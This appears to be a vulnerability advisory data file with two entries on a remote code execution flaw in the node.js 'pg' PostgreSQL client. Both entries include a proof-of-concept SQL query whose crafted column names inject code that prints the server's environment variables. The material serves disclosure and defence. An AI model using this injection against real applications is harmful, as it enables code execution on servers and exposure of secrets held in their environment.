  title: Remote Code Execution
  description: "Affected versions of `pg` contain a remote code execution vulnerability
    that occurs when the remote database or query specifies a crafted column name.
    \n\nThere are two specific scenarios in which it is likely for an application
    to be vulnerable:\n1. The application executes unsafe, user-supplied sql which
    contains malicious column names.\n2. The application connects to an untrusted
    database and executes a query returning results which contain a malicious column
    name.\n\n## Proof of Concept\n```\nconst { Client } = require('pg')\nconst client
    = new Client()\nclient.connect()\n\nconst sql = `SELECT 1 AS \"\\\\'/*\", 2 AS
    \"\\\\'*/\\n + console.log(process.env)] = null;\\n//\"`\n\nclient.query(sql,
    (err, res) => {\n  client.end()\n})\n```"

  title: Arbitrary Code Execution
  description: "[pg][1] is a non-blocking PostgreSQL client for node.js.\n\nAffected
    versions of this package are vulnerable to Arbitrary Code\nExecution. When parsing
    results of a query, it goes through a form of\n`eval`, and with a specially crafted
    column name, an attacker can cause\ncode to run remotely on the server.\n\n**PoC:**\n\n
    \   const { Client } = require('pg')\n    const client = new Client()\n    client.connect()\n
    \   \n    const sql = `SELECT 1 AS \"\\\\'/*\", 2 AS \"\\\\'*/\\n + console.log(process.env)]
    = null;\\n//\"`\n    \n    client.query(sql, (err, res) => {\n      client.end()\n
    \   });\n{: .language-js}\n\n\n\n[1]: https://www.npmjs.com/package/pg\n"
